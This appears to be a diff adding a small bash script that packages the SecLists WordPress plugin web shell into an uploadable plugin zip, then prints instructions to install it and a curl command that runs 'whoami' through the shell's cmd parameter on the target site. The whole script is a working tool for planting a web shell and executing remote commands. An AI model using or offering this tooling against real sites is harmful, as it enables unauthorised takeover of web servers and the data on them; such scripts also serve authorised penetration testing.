@@ -1,0 +1,12 @@
+#!/bin/bash
+
+set -e
+
+tmp=$(mktemp -d)
+
+echo "generating plugin..."
+zip -j "$tmp/plugin-shell.zip" /usr/share/seclists/Web-Shells/WordPress/plugin-shell.php
+echo "Generated!"
+echo "Upload $tmp/plugin-shell.zip"
+echo "Ones installed you got a webshell up and running :D"
+echo 'curl <wp_url>/wp-content/plugins/plugin-shell/plugin-shell.php --url-query "cmd=whoami"'
